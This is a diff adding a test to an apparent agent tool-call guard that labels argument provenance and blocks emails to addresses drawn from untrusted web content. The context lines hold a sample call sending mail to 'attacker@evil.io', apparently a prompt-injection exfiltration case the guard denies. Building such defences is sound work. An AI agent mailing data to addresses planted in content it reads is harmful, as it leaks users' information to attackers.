@@ -268,3 +268,24 @@ async def test_value_index_extends_incrementally_and_evicts() -> None:
         call(sid, "email__send_email", to="attacker@evil.io", subject="s", body="b")
     )
     assert d.rule_id == "no-untrusted-recipient"
+
+
+async def test_address_from_trusted_tool_is_allowed_and_not_untrusted_origin() -> None:
+    engine = make_engine()
+    sid = await session(engine, "Read the page, then email the notes to Alice from our directory")
+    # Untrusted content is in context, so an unknown address would be untrusted_origin.
+    await call_and_result(engine, sid, "web__fetch", {"url": "https://recipes.example"}, PAGE)
+    await call_and_result(
+        engine,
+        sid,
+        "contacts__lookup",
+        {"name": "Alice"},
+        {"name": "Alice", "email": "alice@partner.io"},
+    )
+    d = await engine.check_call(
+        call(sid, "email__send_email", to="alice@partner.io", subject="notes", body="see attached")
+    )
+    assert d.action == "allow", d.message
+    labels = {(p.source, p.trust) for p in d.arg_labels["to"]}
+    assert labels == {("contacts__lookup", "trusted")}
+    assert all(p.trust != "untrusted_origin" for p in d.arg_labels["to"])
